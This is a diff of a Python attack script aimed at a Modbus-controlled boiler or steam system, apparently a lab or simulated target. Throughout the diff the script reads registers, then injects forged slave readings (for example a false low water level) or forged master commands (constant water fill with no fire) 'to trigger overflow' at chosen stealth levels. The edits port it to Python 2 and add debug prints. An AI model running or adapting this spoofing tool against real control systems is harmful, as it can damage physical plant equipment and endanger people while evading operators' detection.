@@ -1,6 +1,6 @@
 import random
 import time
-import networkEncoder as ne
+import NetworkEncoder as ne
 from pymodbus.client.sync import ModbusTcpClient
 
 MODBUS_SLAVE = 'ms.ics.example.com'
@@ -8,7 +8,6 @@ client = ModbusTcpClient(MODBUS_SLAVE)
 
 def readRegisters():
     # Read values from slave
-    client = ModbusTcpClient(MODBUS_SLAVE)
     result = client.read_holding_registers(0, 21, unit=1)
     addWater = ne.modbusDecode(0, 2, 2, result.registers)
     addFire = ne.modbusDecode(2, 2, 0, result.registers)
@@ -28,8 +27,8 @@ print("[r]esponse - Fake slave values to trigger overflow")
 print("[c]ommand  - Fake master values to trigger overflow")
 print("[q]uit")
 
-while response != 'r' and response != 'c' and response != 'q':
-    response = input('>')
+while not response == 'r' and not response == 'c' and not response == 'q':
+    response = raw_input('>')
 
 if response == 'q':
     exit(0)
@@ -44,15 +43,14 @@ if response == 'r':
     print("[4] - Hard to detect")
     print("[q]uit")
 
-    while response != '1' and response != '2' and response != '3' and response != '4' and response != 'q':
-        response = input('>')
+    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
+        response = raw_input('>')
 
     if response == 'q':
         exit(0)
-
+    response = int(response)
     while packetCount < packetSend:
-        time.sleep(0.001 * float(random.randint(0,100)))
-        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
+        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn = readRegisters()
         if response == 1:
             # 2,000L below optimal level
             waterLevel = 500000 - 2000
@@ -77,9 +75,8 @@ if response == 'r':
         outputs = ne.modbusEncode(powerIn, 6, 2, outputs)
 
         write = client.write_registers(3, outputs, unit=1)
-
+        print(packetCount)
         packetCount += 1
-        client.close()
 
 if response == 'c':
     print("Enter stealth level:")
@@ -89,18 +86,20 @@ if response == 'c':
     print("[4] - Hard to detect")
     print("[q]uit")
 
-    while response != '1' and response != '2' and response != '3' and response != '4' and response != 'q':
-        response = input('>')
+    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
+        response = raw_input('>')
 
     if response == 'q':
         exit(0)
 
+    response = int(response)
     while packetCount < packetSend:
-        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
+        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn = readRegisters()
         if response == 1:
             # 1,500L constant fill, no fire
             addWater = 1500
             addFire = 0
+            print("broken")
         if response == 2:
             # 1,500L constant fill, current fire state
             addWater = 1500
@@ -119,6 +118,7 @@ if response == 'c':
         outputs = ne.modbusEncode(addFire, 2, 0, outputs)
         write = client.write_registers(0, outputs, unit=1)
         packetCount += 1
-        client.close()
+        print(packetCount)
 
+client.close()
 
